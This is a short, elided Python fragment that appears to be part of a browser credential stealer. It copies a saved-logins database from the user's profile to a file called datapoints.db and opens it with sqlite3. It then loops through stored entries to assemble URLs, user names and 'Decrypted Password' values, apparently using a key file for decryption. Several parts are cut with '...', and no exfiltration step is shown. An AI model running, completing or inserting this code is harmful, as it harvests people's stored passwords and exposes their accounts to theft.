...
rp = os.environ["USERPROFILE"]
path = os.path.join(os.environ["USERPROFILE"], "temp.txt")
...
def getcredt(dbpath, keypath):
    filename = "\\datapoints.db"
    # time.sleep(10)
    shutil.copy(dbpath, rp + filename)
    db = sqlite3.connect(rp + filename)
    cursor = db.cursor()
    ...
    for row in cursor.fetchall():
        ...
        if user_name or decrypted_password:
            infos = f"""Main URL: {main_url}, Login URL: {login_page_url}, User name: {user_name},Decrypted Password: {decrypted_password}, last used @ : {last_usuage}
            """
